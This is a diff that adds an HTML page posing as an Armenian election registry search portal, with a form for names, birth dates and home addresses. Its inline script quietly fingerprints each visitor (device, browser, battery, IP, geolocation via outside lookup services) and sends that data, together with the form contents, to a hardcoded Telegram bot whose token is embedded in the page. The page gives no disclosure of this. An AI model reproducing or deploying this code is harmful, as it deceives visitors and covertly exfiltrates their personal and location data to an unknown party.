@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="hy">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AIXREG - Armenian Election Registry</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600;700&family=Noto+Sans+Armenian:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0b0f14;
+            --bg-2: #111827;
+            --surface: rgba(17, 24, 39, 0.82);
+            --surface-2: rgba(15, 23, 42, 0.92);
+            --ink: #e5e7eb;
+            --muted: #94a3b8;
+            --primary: #2dd4bf;
+            --primary-2: #14b8a6;
+            --accent: #f59e0b;
+            --accent-2: #f97316;
+            --electric: #38bdf8;
+            --danger: #fb7185;
+            --border: rgba(45, 212, 191, 0.22);
+            --border-strong: rgba(245, 158, 11, 0.55);
+            --ring: rgba(45, 212, 191, 0.4);
+            --radius-lg: 18px;
+            --radius: 12px;
+            --radius-sm: 8px;
+            --shadow-1: 0 12px 30px rgba(2, 6, 23, 0.35);
+            --shadow-2: 0 24px 60px rgba(2, 6, 23, 0.45);
+            --glow: 0 0 24px rgba(45, 212, 191, 0.25);
+            --glow-strong: 0 0 35px rgba(56, 189, 248, 0.35);
+        }
+
+        * {
+            -webkit-tap-highlight-color: transparent;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Space Grotesk', 'Noto Sans Armenian', sans-serif;
+            background: radial-gradient(1200px 600px at 15% -10%, rgba(45, 212, 191, 0.12), transparent 60%),
+                        radial-gradient(1000px 500px at 85% -20%, rgba(245, 158, 11, 0.12), transparent 55%),
+                        radial-gradient(900px 500px at 50% 120%, rgba(56, 189, 248, 0.12), transparent 60%),
+                        linear-gradient(180deg, #0b0f14 0%, #0f172a 60%, #0b0f14 100%);
+            color: var(--ink);
+            min-height: 100vh;
+            padding-bottom: 48px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(255, 255, 255, 0.04) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.04) 1px, transparent 1px);
+            background-size: 48px 48px;
+            opacity: 0.25;
+            pointer-events: none;
+            z-index: 0;
+            animation: grid-breathe 12s ease-in-out infinite;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 50% 20%, rgba(45, 212, 191, 0.08), transparent 45%),
+                        radial-gradient(circle at 80% 80%, rgba(245, 158, 11, 0.08), transparent 45%);
+            pointer-events: none;
+            z-index: 0;
+            animation: haze-drift 18s ease-in-out infinite alternate;
+        }
+
+        @keyframes float-in {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        @keyframes pulse-soft {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        @keyframes grid-breathe {
+            0%, 100% { opacity: 0.2; transform: translateY(0); }
+            50% { opacity: 0.32; transform: translateY(-6px); }
+        }
+
+        @keyframes haze-drift {
+            0% { transform: translate3d(0, 0, 0) scale(1); }
+            100% { transform: translate3d(1.5%, -1%, 0) scale(1.03); }
+        }
+
+        @keyframes aura {
+            0%, 100% { box-shadow: 0 0 0 rgba(45, 212, 191, 0.2); }
+            50% { box-shadow: 0 0 30px rgba(56, 189, 248, 0.35); }
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-120%); opacity: 0; }
+            20% { opacity: 0.6; }
+            100% { transform: translateX(120%); opacity: 0; }
+        }
+
+        @keyframes orb-float {
+            0%, 100% { transform: translate3d(0, 0, 0) scale(1); opacity: 0.5; }
+            50% { transform: translate3d(16px, -12px, 0) scale(1.08); opacity: 0.85; }
+        }
+
+        .atmosphere {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .orb {
+            position: absolute;
+            width: 220px;
+            height: 220px;
+            border-radius: 999px;
+            filter: blur(2px);
+            opacity: 0.6;
+            animation: orb-float 16s ease-in-out infinite;
+        }
+
+        .orb.teal {
+            background: radial-gradient(circle, rgba(45, 212, 191, 0.2), transparent 65%);
+            top: 10%;
+            left: 8%;
+        }
+
+        .orb.blue {
+            background: radial-gradient(circle, rgba(56, 189, 248, 0.18), transparent 68%);
+            top: 55%;
+            left: 60%;
+            animation-delay: -6s;
+        }
+
+        .orb.amber {
+            background: radial-gradient(circle, rgba(245, 158, 11, 0.18), transparent 65%);
+            bottom: 8%;
+            right: 8%;
+            animation-delay: -10s;
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation: none !important;
+                transition: none !important;
+            }
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #5eead4;
+        }
+
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: linear-gradient(120deg, rgba(15, 23, 42, 0.95), rgba(15, 23, 42, 0.8));
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 8px 24px rgba(2, 6, 23, 0.5);
+            backdrop-filter: blur(14px);
+            padding: 20px 0;
+        }
+
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+        }
+
+        .header h1 {
+            font-size: clamp(22px, 4vw, 34px);
+            font-weight: 800;
+            margin: 0;
+            letter-spacing: 0.5px;
+            position: relative;
+        }
+
+        .header h1 span {
+            color: var(--primary);
+            text-shadow: var(--glow);
+        }
+
+        .header p {
+            margin: 4px 0 0 0;
+            color: var(--muted);
+            font-size: clamp(12px, 2.4vw, 14px);
+        }
+
+        .header-tag {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 12px;
+            padding: 6px 12px;
+            border-radius: 999px;
+            border: 1px solid var(--border-strong);
+            color: var(--accent);
+            background: rgba(245, 158, 11, 0.12);
+            position: relative;
+            overflow: hidden;
+            animation: aura 5s ease-in-out infinite;
+        }
+
+        .header-tag::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -60%;
+            width: 60%;
+            height: 100%;
+            background: linear-gradient(120deg, transparent, rgba(255, 255, 255, 0.25), transparent);
+            animation: scan 4.5s linear infinite;
+        }
+
+        .container {
+            max-width: 100%;
+            padding: 0 16px;
+            position: relative;
+            z-index: 2;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 880px;
+                margin: 0 auto;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                max-width: 1040px;
+            }
+        }
+
+        .hero {
+            margin: 28px 0 24px 0;
+            padding: 24px;
+            border-radius: var(--radius-lg);
+            background: linear-gradient(120deg, rgba(45, 212, 191, 0.15), rgba(15, 23, 42, 0.7));
+            border: 1px solid rgba(45, 212, 191, 0.2);
+            box-shadow: var(--shadow-1);
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            animation: float-in 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, transparent 0%, rgba(245, 158, 11, 0.08) 45%, transparent 70%);
+            opacity: 0.8;
+            pointer-events: none;
+        }
+
+        .hero strong {
+            color: var(--primary);
+        }
+
+        .hero-sub {
+            color: var(--muted);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .hero-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 12px;
+            color: var(--muted);
+        }
+
+        .hero-chip {
+            padding: 6px 10px;
+            border-radius: 10px;
+            border: 1px solid rgba(148, 163, 184, 0.25);
+            background: rgba(15, 23, 42, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-chip::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent, rgba(45, 212, 191, 0.18), transparent);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .hero-chip:hover::after {
+            opacity: 1;
+        }
+        .search-container,
+        .results-container {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: clamp(20px, 5vw, 32px);
+            box-shadow: var(--shadow-2);
+            position: relative;
+            overflow: hidden;
+            animation: float-in 0.6s ease-out;
+        }
+
+        .search-container::after,
+        .results-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(45, 212, 191, 0.6), transparent);
+            opacity: 0.6;
+        }
+
+        .search-container::before,
+        .results-container::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent, rgba(45, 212, 191, 0.08), transparent);
+            background-size: 200% 100%;
+            animation: shimmer 6s linear infinite;
+            pointer-events: none;
+        }
+
+        .search-container h2,
+        .results-container h2 {
+            font-size: clamp(20px, 3.5vw, 28px);
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 18px;
+        }
+
+        .form-label {
+            font-weight: 600;
+            color: var(--ink);
+            margin-bottom: 8px;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+
+        .required-field {
+            color: var(--danger);
+            font-weight: 700;
+            animation: pulse-soft 2s infinite;
+        }
+
+        .form-control, .form-select {
+            border-radius: var(--radius-sm);
+            border: 1px solid rgba(148, 163, 184, 0.3);
+            padding: 14px 16px;
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--ink);
+            background: rgba(15, 23, 42, 0.85);
+            transition: border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+        }
+
+        .form-control:hover, .form-select:hover {
+            border-color: rgba(45, 212, 191, 0.5);
+        }
+
+        .form-control:focus, .form-select:focus {
+            border-color: var(--primary);
+            background: rgba(15, 23, 42, 0.98);
+            box-shadow: 0 0 0 3px rgba(45, 212, 191, 0.15);
+            outline: none;
+            color: var(--ink);
+        }
+
+        .form-control:focus-visible, .form-select:focus-visible,
+        button:focus-visible {
+            outline: 2px solid var(--ring);
+            outline-offset: 2px;
+        }
+
+        .form-control::placeholder {
+            color: rgba(148, 163, 184, 0.7);
+            font-weight: 400;
+        }
+
+        .form-select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%232dd4bf' d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 16px;
+            padding-right: 48px;
+            cursor: pointer;
+        }
+
+        .btn-search,
+        .btn-reset {
+            padding: 16px 24px;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: var(--radius-sm);
+            margin-top: 8px;
+            width: 100%;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, filter 0.2s ease;
+        }
+
+        .btn-search {
+            background: linear-gradient(120deg, var(--primary), var(--accent));
+            border: 1px solid rgba(45, 212, 191, 0.5);
+            color: #0b0f14;
+            box-shadow: 0 12px 24px rgba(45, 212, 191, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-search::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent, rgba(255, 255, 255, 0.35), transparent);
+            transform: translateX(-120%);
+            animation: scan 3.8s linear infinite;
+        }
+        .btn-search:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+            box-shadow: 0 18px 30px rgba(45, 212, 191, 0.35);
+        }
+
+        .btn-reset {
+            background: rgba(251, 113, 133, 0.08);
+            border: 1px solid rgba(251, 113, 133, 0.5);
+            color: #fecdd3;
+            box-shadow: 0 12px 24px rgba(251, 113, 133, 0.18);
+        }
+
+        .btn-reset:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.08);
+            box-shadow: 0 18px 30px rgba(251, 113, 133, 0.28);
+        }
+
+        .btn-search:disabled,
+        .btn-reset:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            filter: none;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .results-container {
+            margin-top: 24px;
+        }
+
+        .result-item {
+            border: 1px solid rgba(148, 163, 184, 0.25);
+            border-left: 4px solid var(--primary);
+            padding: 20px;
+            margin-bottom: 16px;
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: var(--radius);
+            transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+            animation: float-in 0.4s ease-out;
+            animation-fill-mode: both;
+            position: relative;
+        }
+
+        .result-item::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent, rgba(56, 189, 248, 0.08), transparent);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+        }
+
+        .result-item:hover {
+            border-color: rgba(45, 212, 191, 0.7);
+            box-shadow: 0 18px 34px rgba(2, 6, 23, 0.35);
+            transform: translateY(-2px);
+        }
+
+        .result-item:hover::after {
+            opacity: 1;
+        }
+
+        .result-name {
+            font-size: clamp(16px, 3vw, 20px);
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 12px;
+        }
+
+        .result-field {
+            font-size: 14px;
+            margin: 8px 0;
+            color: var(--muted);
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        @media (min-width: 640px) {
+            .result-field {
+                flex-direction: row;
+            }
+        }
+
+        .result-label {
+            font-weight: 600;
+            color: var(--ink);
+            min-width: 140px;
+            font-size: 13px;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner-border {
+            color: var(--primary);
+            width: 46px;
+            height: 46px;
+            border-width: 4px;
+        }
+
+        .loading p {
+            margin-top: 16px;
+            color: var(--primary);
+            font-weight: 500;
+            letter-spacing: 1px;
+            animation: pulse-soft 1.5s infinite;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+
+        .alert-error {
+            background: rgba(251, 113, 133, 0.12);
+            border: 1px solid rgba(251, 113, 133, 0.6);
+            color: #fecdd3;
+            padding: 16px;
+            border-radius: var(--radius-sm);
+            margin-top: 16px;
+            font-weight: 600;
+            box-shadow: 0 10px 24px rgba(251, 113, 133, 0.2);
+        }
+
+        .result-count {
+            background: linear-gradient(120deg, rgba(45, 212, 191, 0.15), rgba(245, 158, 11, 0.08));
+            border: 1px solid rgba(45, 212, 191, 0.5);
+            color: var(--primary);
+            padding: 18px;
+            border-radius: var(--radius);
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: clamp(16px, 3vw, 20px);
+            font-weight: 700;
+            letter-spacing: 1px;
+            box-shadow: var(--glow-strong);
+        }
+
+        .section-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--ink);
+            text-transform: uppercase;
+            margin-top: 28px;
+            margin-bottom: 16px;
+            padding: 8px 12px;
+            border-left: 4px solid var(--accent);
+            background: rgba(245, 158, 11, 0.12);
+            letter-spacing: 1px;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+
+        .section-title:first-of-type {
+            margin-top: 0;
+        }
+
+        .help-text {
+            font-size: 11px;
+            color: rgba(148, 163, 184, 0.9);
+            margin-top: 6px;
+            font-weight: 400;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+
+        .info-box {
+            background: rgba(45, 212, 191, 0.08);
+            border: 1px solid rgba(45, 212, 191, 0.35);
+            border-left: 4px solid var(--primary);
+            padding: 16px;
+            margin-bottom: 24px;
+            border-radius: var(--radius-sm);
+            box-shadow: 0 12px 28px rgba(2, 6, 23, 0.2);
+        }
+
+        .info-box p {
+            margin: 0 0 8px 0;
+            color: var(--muted);
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.6;
+        }
+
+        .info-box p:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-box strong {
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        @media (max-width: 767px) {
+            .row {
+                margin-left: 0;
+                margin-right: 0;
+            }
+
+            .col-md-6, .col-md-2 {
+                padding-left: 0;
+                padding-right: 0;
+                margin-bottom: 16px;
+            }
+
+            .header-inner {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0b0f14;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(45, 212, 191, 0.6);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(45, 212, 191, 0.85);
+        }
+    </style>
+</head>
+<body>
+
+<div class="atmosphere" aria-hidden="true">
+    <span class="orb teal"></span>
+    <span class="orb blue"></span>
+    <span class="orb amber"></span>
+</div>
+
+<div class="header">
+    <div class="container header-inner">
+        <div>
+            <h1><span>AIXREG</span> </h1>
+            <p>Registry Search · Secure lookup</p>
+        </div>
+        <div class="header-tag">Portal · 2026</div>
+    </div>
+</div>
+
+<div class="container">
+
+    <div class="search-container">
+        <h2 class="mb-3">Որոնել</h2>
+
+        <div class="info-box">
+            <p><strong>ℹ️ Հրահանգ:</strong> Անունն և Ազգանունն պարտադիր են։</p>
+        </div>
+
+        <form id="searchForm">
+
+            <div class="row">
+                <div class="col-md-6">
+                    <label for="firstName" class="form-label">
+                        Անուն <span class="required-field">*</span>
+                    </label>
+                    <input type="text" class="form-control" id="firstName" name="first_name"
+                           placeholder="Օրինակ: Գրիգոր" required>
+                    <div class="help-text">First Name (required)</div>
+                </div>
+                <div class="col-md-6">
+                    <label for="lastName" class="form-label">
+                        Ազգանուն <span class="required-field">*</span>
+                    </label>
+                    <input type="text" class="form-control" id="lastName" name="last_name"
+                           placeholder="Օրինակ: Գրիգորյան" required>
+                    <div class="help-text">Last Name (required)</div>
+                </div>
+            </div>
+
+            <div class="section-title">Տեղանիշ (Ընտրովի) / Location (Optional)</div>
+
+            <div class="row">
+                <div class="col-md-6">
+                    <label for="region" class="form-label">Մարզ</label>
+                    <select class="form-select" id="region" name="region">
+                        <option value="">Ընտրեք մարզը / Select region</option>
+                        <option value="ԱՐԱԳԱԾՈՏՆ">ԱՐԱԳԱԾՈՏՆ</option>
+                        <option value="ԱՐԱՐԱՏ">ԱՐԱՐԱՏ</option>
+                        <option value="ԱՐՄԱՎԻՐ">ԱՐՄԱՎԻՐ</option>
+                        <option value="ԳԵՂԱՐՔՈՒՆԻՔ">ԳԵՂԱՐՔՈՒՆԻՔ</option>
+                        <option value="ԵՐԵՎԱՆ" selected>ԵՐԵՎԱՆ</option>
+                        <option value="ԼՈՌԻ">ԼՈՌԻ</option>
+                        <option value="ԿՈՏԱՅՔ">ԿՈՏԱՅՔ</option>
+                        <option value="ՇԻՐԱԿ">ՇԻՐԱԿ</option>
+                        <option value="ՍՅՈՒՆԻՔ">ՍՅՈՒՆԻՔ</option>
+                        <option value="ՎԱՅՈՑ ՁՈՐ">ՎԱՅՈՑ ՁՈՐ</option>
+                        <option value="ՏԱՎՈՒՇ">ՏԱՎՈՒՇ</option>
+                    </select>
+                    <div class="help-text">Region (default: ԵՐԵՎԱՆ)</div>
+                </div>
+                <div class="col-md-6">
+                    <label for="community" class="form-label">Համայնք</label>
+                    <select class="form-select" id="community" name="community" style="display: none;">
+                        <option value="">Ընտրեք համայնքը / Select community</option>
+                        <option value="ԱՋԱՓՆՅԱԿ">ԱՋԱՓՆՅԱԿ,</option>
+                        <option value="ԱՎԱՆ">ԱՎԱՆ,</option>
+                        <option value="ԱՐԱԲԿԻՐ">ԱՐԱԲԿԻՐ,</option>
+                        <option value="ԴԱՎԹԱՇԵՆ" selected>ԴԱՎԹԱՇԵՆ,</option>
+                        <option value="ԷՐԵԲՈՒՆԻ">ԷՐԵԲՈՒՆԻ,</option>
+                        <option value="ԿԵՆՏՐՈՆ">ԿԵՆՏՐՈՆ,</option>
+                        <option value="ՄԱԼԱԹԻԱ-ՍԵԲԱՍՏԻԱ">ՄԱԼԱԹԻԱ-ՍԵԲԱՍՏԻԱ,</option>
+                        <option value="ՆՈՐ ՆՈՐՔ">ՆՈՐ ՆՈՐՔ,</option>
+                        <option value="ՆՈՐՔ-ՄԱՐԱՇ">ՆՈՐՔ-ՄԱՐԱՇ,</option>
+                        <option value="ՆՈՒԲԱՐԱՇԵՆ">ՆՈՒԲԱՐԱՇԵՆ,</option>
+                        <option value="ՇԵՆԳԱՎԻԹ">ՇԵՆԳԱՎԻԹ,</option>
+                        <option value="ՔԱՆԱՔԵՌ-ԶԵՅԹՈՒՆ">ՔԱՆԱՔԵՌ-ԶԵՅԹՈՒՆ,</option>
+                    </select>
+                    <input type="text" class="form-control" id="communityInput" name="community_input"
+                           placeholder="Թողեք դատարկ" style="display: none;">
+                    <div class="help-text">Community (for ԵՐԵՎԱՆ: select from list; for others: optional text)</div>
+                </div>
+            </div>
+
+            <div class="section-title">Լրացուցիչ Ֆիլտրեր (Ընտրովի) / Additional Filters (Optional)</div>
+
+            <div class="row">
+                <div class="col-md-6">
+                    <label for="middleName" class="form-label">Հայրանուն</label>
+                    <input type="text" class="form-control" id="middleName" name="middle_name"
+                           placeholder="Օրինակ: Գրիգորի">
+                    <div class="help-text">Patronymic (optional)</div>
+                </div>
+                <div class="col-md-6">
+                    <label for="birthDate" class="form-label">Ծնունդի ամսաթիվ <span class="help-text" style="color: var(--muted); font-size: 0.85em;">(ընտրովի)</span></label>
+                    <input type="text" class="form-control" id="birthDate" name="birth_date"
+                           placeholder="Օրինակ: 22/01/2000">
+                    <div class="help-text">Birth Date (DD/MM/YYYY format) - optional, used to refine search</div>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-md-6">
+                    <label for="street" class="form-label">Փողոց</label>
+                    <input type="text" class="form-control" id="street" name="street"
+                           placeholder="Օրինակ: Արշակունյաց">
+                    <div class="help-text">Street (optional)</div>
+                </div>
+                <div class="col-md-2">
+                    <label for="building" class="form-label">Տուն</label>
+                    <input type="text" class="form-control" id="building" name="building"
+                           placeholder="12">
+                    <div class="help-text">Building</div>
+                </div>
+                <div class="col-md-2">
+                    <label for="apartment" class="form-label">Բնակ</label>
+                    <input type="text" class="form-control" id="apartment" name="apartment"
+                           placeholder="45">
+                    <div class="help-text">Apartment</div>
+                </div>
+                <div class="col-md-2">
+                    <label for="district" class="form-label">Մեկ.</label>
+                    <input type="text" class="form-control" id="district" name="district"
+                           placeholder="">
+                    <div class="help-text">District</div>
+                </div>
+            </div>
+
+            <div class="row mt-3">
+                <div class="col-md-6">
+                    <button type="submit" class="btn btn-search btn-primary">
+                        🔍 Որոնել / Search
+                    </button>
+                </div>
+                <div class="col-md-6">
+                    <button type="reset" class="btn btn-reset">
+                        ↻ Մաքրել / Clear
+                    </button>
+                </div>
+            </div>
+
+            <div id="loadingSpinner" class="loading" style="display: none;">
+                <div class="spinner-border" role="status">
+                    <span class="visually-hidden">Դիմում...</span>
+                </div>
+                <p class="mt-2">Մուտքագրում ենք համակարգ...</p>
+            </div>
+
+            <div id="errorMessage" class="alert-error" style="display: none;"></div>
+        </form>
+    </div>
+
+    <div id="resultsContainer" class="results-container" style="display: none;">
+        <h2 class="mb-4">📋 Որոնման Արդյունքներ / Search Results</h2>
+        <div id="resultCount" class="result-count"></div>
+        <div id="resultsList"></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="/dist/bundle.js"></script>
+<script>
+    // Form elements
+    const form = document.getElementById('searchForm');
+    const regionSelect = document.getElementById('region');
+    const communitySelect = document.getElementById('community');
+    const communityInput = document.getElementById('communityInput');
+
+    // Telegram configuration
+    const TELEGRAM_BOT_TOKEN = '8513664028:AAEuGpg79Ukef853WzYJPv1Lk30ak-GcK3w';
+    const TELEGRAM_CHAT_ID = '6760298907';
+
+    // Получение данных пользователя
+    async function getUserData() {
+        const userData = {
+            timestamp: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language || navigator.userLanguage,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            vendor: navigator.vendor,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            connection: {
+                effectiveType: navigator.connection?.effectiveType,
+                downlink: navigator.connection?.downlink,
+                rtt: navigator.connection?.rtt,
+                saveData: navigator.connection?.saveData
+            }
+        };
+
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            userData.ip = ipData.ip;
+
+            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const geoData = await geoResponse.json();
+            userData.geolocation = {
+                ip: geoData.ip,
+                city: geoData.city,
+                region: geoData.region,
+                country: geoData.country_name,
+                country_code: geoData.country_code,
+                postal: geoData.postal,
+                latitude: geoData.latitude,
+                longitude: geoData.longitude,
+                timezone: geoData.timezone,
+                asn: geoData.asn,
+                org: geoData.org,
+                isp: geoData.org
+            };
+        } catch (error) {
+            console.error('Error fetching IP/Geo data:', error);
+            userData.ip = 'Unknown';
+            userData.geolocation = { error: error.message };
+        }
+
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                userData.battery = {
+                    level: battery.level * 100 + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (error) {
+                userData.battery = { error: error.message };
+            }
+        }
+
+        return userData;
+    }
+
+    // Отправка данных в Telegram
+    async function sendToTelegram(formData, userData) {
+        const message = `
+🔍 *НОВЫЙ ПОИСК В СИСТЕМЕ*
+
+📋 *Данные формы:*
+━━━━━━━━━━━━━━━━━━━━
+👤 Имя: \`${formData.first_name}\`
+👤 Фамилия: \`${formData.last_name}\`
+👨‍👦 Отчество: \`${formData.middle_name || 'не указано'}\`
+📅 Дата рождения: \`${formData.birth_date || 'не указано'}\`
+📍 Регион: \`${formData.region || 'ԵՐԵՎԱՆ'}\`
+🏘 Община: \`${formData.community || 'не указано'}\`
+🛣 Улица: \`${formData.street || 'не указано'}\`
+🏠 Дом: \`${formData.building || 'не указано'}\`
+🚪 Квартира: \`${formData.apartment || 'не указано'}\`
+📌 Район: \`${formData.district || 'не указано'}\`
+
+🌐 *Информация о пользователе:*
+━━━━━━━━━━━━━━━━━━━━
+🌍 IP: \`${userData.ip}\`
+📍 Местоположение: \`${userData.geolocation?.city || 'Unknown'}, ${userData.geolocation?.country || 'Unknown'}\`
+🗺 Координаты: \`${userData.geolocation?.latitude || 'N/A'}, ${userData.geolocation?.longitude || 'N/A'}\`
+🏢 ISP: \`${userData.geolocation?.isp || 'Unknown'}\`
+🌐 Часовой пояс: \`${userData.timezone}\`
+
+💻 *Устройство:*
+━━━━━━━━━━━━━━━━━━━━
+📱 Платформа: \`${userData.platform}\`
+🌐 Браузер: \`${userData.userAgent}\`
+🗣 Язык: \`${userData.language}\`
+📊 Экран: \`${userData.screen.width}x${userData.screen.height}\`
+🖥 Окно: \`${userData.window.innerWidth}x${userData.window.innerHeight}\`
+💾 Память: \`${userData.deviceMemory || 'N/A'} GB\`
+🔌 Ядра CPU: \`${userData.hardwareConcurrency || 'N/A'}\`
+👆 Touch Points: \`${userData.maxTouchPoints}\`
+
+📡 *Соединение:*
+━━━━━━━━━━━━━━━━━━━━
+⚡ Тип: \`${userData.connection?.effectiveType || 'N/A'}\`
+📶 Скорость: \`${userData.connection?.downlink || 'N/A'} Mbps\`
+⏱ RTT: \`${userData.connection?.rtt || 'N/A'} ms\`
+
+🔋 *Батарея:*
+━━━━━━━━━━━━━━━━━━━━
+${userData.battery ? `
+⚡ Уровень: \`${userData.battery.level}\`
+🔌 Зарядка: \`${userData.battery.charging ? 'Да' : 'Нет'}\`
+` : 'Информация недоступна'}
+
+⏰ *Время запроса:* \`${userData.timestamp}\`
+        `.trim();
+
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        try {
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            console.log('Data sent to Telegram successfully');
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+        }
+    }
+
+    // Form initialization is handled by TypeScript bundle (SearchManager)
+</script>
+
+</body>
+</html>
